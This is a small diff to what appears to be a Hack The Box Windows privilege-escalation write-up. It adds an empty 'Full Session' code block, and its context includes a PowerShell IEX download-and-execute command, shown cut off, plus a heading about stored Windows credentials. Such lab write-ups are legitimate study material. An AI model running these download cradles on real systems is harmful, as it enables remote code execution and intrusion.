@@ -187,6 +187,10 @@ C:\Users\security\Desktop>powershell "IEX(New-Object Net.WebClient).downloadStri
 ```
 ![image](https://github.com/0xhardyboy/Hack-the-Box/assets/83878909/ad32556d-50f5-4ce8-8e35-28b43a952815)
 
+####  Full Session
+```CSS
+
+```
 
 ## Stored Windows Credentials
   - Check if any stored credentials exist.
